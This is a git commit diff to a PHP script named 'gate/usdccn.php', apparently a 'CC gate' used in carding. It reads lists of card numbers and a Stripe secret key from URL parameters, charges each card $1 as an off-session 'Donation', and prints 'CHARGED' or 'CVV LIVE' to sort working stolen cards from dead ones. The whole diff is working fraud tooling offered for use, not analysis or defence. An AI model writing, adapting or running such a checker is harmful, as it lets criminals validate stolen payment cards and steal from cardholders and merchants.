4a4825a0a6b1ffba9815f68528c2ba4bcf428fe6
Hazn <98443038+itzYoungHazn@users.noreply.github.com>
2023-06-26 14:47:44 +0700

    Update and rename eurccn.php to usdccn.php

--- gate/usdccn.php
+++ gate/usdccn.php
@@ -1,7 +1,7 @@
 <?php
 
 
-///--------------------ゆə͜͡ʍᴏん-----------------///
+///--------------------Hazn-----------------///
 
 
 error_reporting(1);
@@ -27,11 +27,6 @@ function multiexplode($seperator, $string){
     };
 
 $idd = $_GET['idd'];
-$amt = $_GET['cst'];
-if(empty($amt)) {
-	$amt = '1';
-	$chr = $amt * 100;
-}
 $sk = $_GET['sec'];
 $lista = $_GET['lista'];
     $cc = multiexplode(array(":", "|", ""), $lista)[0];
@@ -116,7 +111,7 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 
 curl_setopt($ch, CURLOPT_USERPWD, $sk. ':' . '');  
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount='.$chr.'&currency=eur&payment_method_types[]=card&description=Demon Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'amount=100&currency=usd&payment_method_types[]=card&description=Hazn Donation&payment_method='.$tok1.'&confirm=true&off_session=true');  
 
 $result2 = curl_exec($ch);  
 
@@ -149,7 +144,7 @@ if(strpos($result2, '"seller_message": "Payment complete."' )) {
    
     
    
-    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: €'.$amt.' CCN Charged ✅ ゆə͜͡ʍᴏん  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
+    echo 'CHARGED</span>  </span>CC:  '.$lista.'</span>  <br>➤ Response: $1 CCN Charged ✅ Hazn  <br> ➤ Receipt : <a href='.$receipturl.'>Here</a><br>';
 }
 elseif(strpos($result2,'"cvc_check": "pass"')){
     echo 'CVV</span>  </span>CC:  '.$lista.'</span>  <br>Result: CVV LIVE</span><br>';
